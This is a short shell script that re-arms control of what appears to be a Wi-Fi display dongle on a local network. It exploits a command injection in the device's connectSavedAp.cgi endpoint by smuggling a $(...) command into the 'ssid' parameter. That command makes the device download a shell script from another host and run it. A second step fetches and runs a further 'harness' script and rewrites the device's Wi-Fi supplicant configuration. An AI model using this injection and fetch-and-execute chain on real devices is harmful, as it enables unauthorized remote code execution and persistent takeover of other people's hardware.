#!/bin/sh
# rearm.sh — full re-arm after dongle returns to main: poller + harness + channel pin
# 1. station-mode injection of the poller (t4)
curl -s -m 30 -G 'http://192.168.8.160/cgi-bin/connectSavedAp.cgi' \
    --data-urlencode 'ssid=A$(/system/bin/busybox wget -q -O /data/t4 http://192.168.8.208:8000/t4.sh&&/system/bin/sh /data/t4&)' \
    -o /dev/null -w 'arm: %{http_code} %{time_total}s\n'
sleep 20
# 2. harness + fixes through the poller
./rsh.sh 'busybox wget -q -O /mnt/ram0/kh http://192.168.8.208:8000/kharness.sh;sh /mnt/ram0/kh;echo country=US >> /data/misc/wifi/p2p_supplicant.conf;echo p2p_oper_channel=36 >> /data/misc/wifi/p2p_supplicant.conf;echo SM_MODE_STA_P2P > /data/misc/wifi/sm_mode;grep -c . /data/misc/wifi/p2p_supplicant.conf'
